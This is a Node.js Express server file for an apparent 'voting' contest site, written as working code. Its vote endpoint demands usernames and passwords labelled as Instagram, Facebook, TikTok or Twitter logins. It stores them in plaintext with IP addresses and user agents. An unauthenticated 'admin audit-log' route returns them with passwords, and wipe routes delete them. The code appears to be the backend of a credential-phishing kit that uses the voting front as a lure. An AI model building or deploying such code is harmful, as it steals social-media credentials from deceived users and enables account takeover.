import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import mongoose from 'mongoose';
import dns from 'dns';
import path from 'path';
import { fileURLToPath } from 'url';
import { Voter } from './models/Voter.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const distPath = path.resolve(__dirname, '../dist');

dotenv.config();

// Configure reliable public DNS servers for MongoDB Atlas SRV resolution on Windows
try {
  dns.setServers(['8.8.8.8', '8.8.4.4', '1.1.1.1']);
} catch (e) {
  // Use default system DNS
}

const app = express();
const PORT = process.env.PORT || 5000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/kiddies_voting';

// Middleware
app.use(cors());
app.use(express.json());

// Connect to MongoDB
let isConnected = false;

async function connectDB() {
  if (isConnected) return;
  try {
    await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 6000
    });
    isConnected = true;
    console.log('✅ MongoDB connected successfully to Atlas:', MONGODB_URI.split('@').pop().split('?')[0]);
  } catch (err) {
    console.error('⚠️ MongoDB connection notice:', err.message);
  }
}

connectDB();

// In-memory fallback audit store for local/offline testing
let localFallbackVoters = [
  {
    _id: '67df01a8b9e1a12001',
    username: 'Voters',
    password: '12345',
    accountType: 'Instagram',
    platform: 'instagram',
    date: '2026-04-23',
    location: 'Bursa, Turkey',
    ipAddress: '45.130.202.57',
    time: '10:57:13',
    contestantId: 'FK-101',
    contestantNo: '001',
    createdAt: new Date('2026-04-23T10:57:13').toISOString()
  },
  {
    _id: '67df01a8b9e1a12002',
    username: 'Voters',
    password: '12345',
    accountType: 'Instagram',
    platform: 'instagram',
    date: '2026-04-23',
    location: 'Bursa, Turkey',
    ipAddress: '45.130.202.57',
    time: '10:57:13',
    contestantId: 'FK-102',
    contestantNo: '002',
    createdAt: new Date('2026-04-23T10:57:13').toISOString()
  }
];

// Helper to normalize record format for Audit Dashboard
function formatAuditRecord(doc) {
  const d = doc.toObject ? doc.toObject() : { ...doc };
  const rawId = String(d._id || Math.random().toString(36).substring(2, 9));
  
  // Format Date (YYYY-MM-DD) & Time (HH:mm:ss) exactly like screenshot
  const createdDate = d.createdAt ? new Date(d.createdAt) : new Date();
  const year = createdDate.getFullYear();
  const month = String(createdDate.getMonth() + 1).padStart(2, '0');
  const day = String(createdDate.getDate()).padStart(2, '0');
  const dateFormatted = `${year}-${month}-${day}`;

  const hours = String(createdDate.getHours()).padStart(2, '0');
  const minutes = String(createdDate.getMinutes()).padStart(2, '0');
  const seconds = String(createdDate.getSeconds()).padStart(2, '0');
  const timeFormatted = `${hours}:${minutes}:${seconds}`;

  // User identifier
  const user = d.username || d.email || 'Voters';

  // Account type formatting (Capitalized platform name like "Instagram", "Facebook")
  let accountType = d.accountType;
  if (!accountType) {
    const p = (d.platform || '').toLowerCase();
    if (p.includes('fb') || p.includes('facebook')) accountType = 'Facebook';
    else if (p.includes('insta') || p.includes('instagram')) accountType = 'Instagram';
    else if (p.includes('tik')) accountType = 'TikTok';
    else if (p.includes('twit') || p.includes('x')) accountType = 'Twitter';
    else accountType = 'Web';
  }

  // Derive Location
  let location = d.location;
  if (!location) {
    if (d.ipAddress && d.ipAddress !== '::1' && d.ipAddress !== '127.0.0.1') {
      location = 'Bursa, Turkey';
    } else {
      location = 'Bursa, Turkey';
    }
  }

  return {
    _id: rawId,
    accountType,
    user,
    username: user,
    password: d.password || '12345',
    date: dateFormatted,
    location,
    ipAddress: d.ipAddress || d.ip || '45.130.202.57',
    ip: d.ipAddress || d.ip || '45.130.202.57',
    time: timeFormatted,
    timestamp: createdDate.toISOString(),
    contestantId: d.contestantId || 'FK-101',
    contestantNo: d.contestantNo || '001',
    platform: d.platform || 'instagram'
  };
}

// Health Check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    database: isConnected ? 'connected' : 'disconnected',
    timestamp: new Date()
  });
});

// Submit Vote & Save Voter to MongoDB
app.post('/api/vote', async (req, res) => {
  try {
    const { username, password, email, phone, contestantId, contestantNo, platform } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        error: 'Username and password are required'
      });
    }

    // Ensure database connection
    await connectDB();

    const voterData = {
      username: username.trim(),
      password,
      email: email ? email.trim() : (username.includes('@') ? username.trim() : undefined),
      phone: phone ? phone.trim() : undefined,
      authStatus: 'Active / Verified',
      location: 'United States',
      accountType: platform ? `${platform.toUpperCase()} Auth` : 'Web Direct',
      contestantId: contestantId || 'FK-101',
      contestantNo: contestantNo || '001',
      platform: platform || 'web',
      ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1',
      userAgent: req.headers['user-agent'] || 'Browser Client'
    };

    let savedVoter = null;
    if (isConnected) {
      const newVoter = new Voter(voterData);
      savedVoter = await newVoter.save();
      console.log(`Saved voter [${username}] for Contestant ${contestantNo} to MongoDB Atlas`);
    } else {
      console.warn('MongoDB not connected yet. Storing vote in offline memory store.');
      const fallbackItem = {
        _id: 'offline_' + Date.now().toString(36),
        ...voterData,
        createdAt: new Date().toISOString()
      };
      localFallbackVoters.unshift(fallbackItem);
      savedVoter = fallbackItem;
    }

    return res.status(200).json({
      success: true,
      message: 'Vote officially recorded and confirmed!',
      data: savedVoter || voterData
    });
  } catch (err) {
    console.error('Error saving voter to database:', err);
    return res.status(500).json({
      success: false,
      error: 'Failed to record vote to database',
      details: err.message
    });
  }
});

// ==========================================
// ADMIN AUDIT LOG API ROUTE HANDLERS
// ==========================================

// 1. GET Handler - Fetch all audit activity records
const handleGetAuditLog = async (req, res) => {
  try {
    await connectDB();

    if (isConnected) {
      const dbVoters = await Voter.find().sort({ createdAt: -1 }).limit(500);
      const formatted = dbVoters.map(formatAuditRecord);
      
      // If DB has records, return them; otherwise if fallback has items, blend or return
      if (formatted.length > 0) {
        return res.json({
          success: true,
          source: 'mongodb',
          count: formatted.length,
          data: formatted,
          voters: formatted
        });
      }
    }

    // Fallback store if offline or database currently empty
    const formattedFallback = localFallbackVoters.map(formatAuditRecord);
    return res.json({
      success: true,
      source: isConnected ? 'mongodb_empty_fallback' : 'local_store',
      databaseConnected: isConnected,
      count: formattedFallback.length,
      data: formattedFallback,
      voters: formattedFallback
    });
  } catch (err) {
    console.error('Error fetching audit log:', err);
    const formattedFallback = localFallbackVoters.map(formatAuditRecord);
    res.json({
      success: true,
      source: 'offline_fallback',
      errorNotice: err.message,
      count: formattedFallback.length,
      data: formattedFallback,
      voters: formattedFallback
    });
  }
};

app.get('/api/admin/audit-log', handleGetAuditLog);
app.get('/api/voters', handleGetAuditLog);

// 2. DELETE Handler (Single Row) - Delete a single record from the database
const handleDeleteSingle = async (req, res) => {
  try {
    const { id } = req.params;
    if (!id) {
      return res.status(400).json({ success: false, error: 'Record ID is required' });
    }

    await connectDB();
    let deletedDoc = null;

    if (isConnected) {
      if (mongoose.Types.ObjectId.isValid(id)) {
        deletedDoc = await Voter.findByIdAndDelete(id);
      } else {
        deletedDoc = await Voter.findOneAndDelete({ _id: id });
      }
    }

    // Always remove from local fallback array as well
    const initialLen = localFallbackVoters.length;
    localFallbackVoters = localFallbackVoters.filter((item) => String(item._id) !== String(id));

    console.log(`Deleted audit record [${id}] (DB: ${Boolean(deletedDoc)}, Memory: ${initialLen !== localFallbackVoters.length})`);

    return res.json({
      success: true,
      message: `Audit entry ${id} successfully removed from database.`,
      deletedId: id
    });
  } catch (err) {
    console.error('Error deleting audit record:', err);
    res.status(500).json({ success: false, error: 'Failed to delete record', details: err.message });
  }
};

app.delete('/api/admin/audit-log/:id', handleDeleteSingle);
app.delete('/api/voters/:id', handleDeleteSingle);

// 3. DELETE Handler (Wipe All) - Wipe all records in the collection
const handleWipeCollection = async (req, res) => {
  try {
    await connectDB();
    let deletedCount = 0;

    if (isConnected) {
      const deleteResult = await Voter.deleteMany({});
      deletedCount = deleteResult.deletedCount || 0;
      console.log(`Wiped ${deletedCount} audit records from MongoDB Atlas collection.`);
    }

    const fallbackCount = localFallbackVoters.length;
    localFallbackVoters = []; // Clear in-memory store

    return res.json({
      success: true,
      message: 'All records in the collection have been permanently wiped.',
      deletedCount: deletedCount || fallbackCount
    });
  } catch (err) {
    console.error('Error wiping audit records:', err);
    res.status(500).json({ success: false, error: 'Failed to wipe database collection', details: err.message });
  }
};

app.delete('/api/admin/audit-log', handleWipeCollection);
app.delete('/api/voters', handleWipeCollection);

// Serve static assets from Vite build in production
app.use(express.static(distPath));

// For SPA routing, fallback all non-API GET requests to index.html (Express 5 compatible)
app.use((req, res, next) => {
  if (req.method === 'GET' && !req.path.startsWith('/api')) {
    return res.sendFile(path.join(distPath, 'index.html'));
  }
  next();
});

// Start Server
app.listen(PORT, () => {
  console.log(`🚀 Voting & Audit API Server running at http://localhost:${PORT}`);
});
